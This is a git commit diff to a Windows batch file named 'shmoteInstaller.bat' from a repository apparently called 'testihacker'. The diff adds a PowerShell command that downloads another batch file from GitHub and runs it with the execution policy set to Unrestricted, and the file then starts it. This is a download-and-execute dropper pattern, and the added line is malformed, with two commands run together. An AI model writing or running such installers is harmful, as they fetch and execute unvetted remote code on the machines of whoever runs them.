84b23500cdadd3e2e7ae7bd4da77ca2e6d49e161
hackti960 <71400364+hackti960@users.noreply.github.com>
2020-10-19 15:09:07 +0300

    new

--- shmoteInstaller.bat
+++ shmoteInstaller.bat
@@ -1,3 +1,3 @@
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hackti960/testihacker/blob/master/shmote.bat', 'shmote.bat')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hackti960/testihacker/blob/master/shmote.bat', 'shmote.bat')"powershell -NoProfile -ExecutionPolicy Unrestricted -File shmote.bat
 
 start shmote.bat
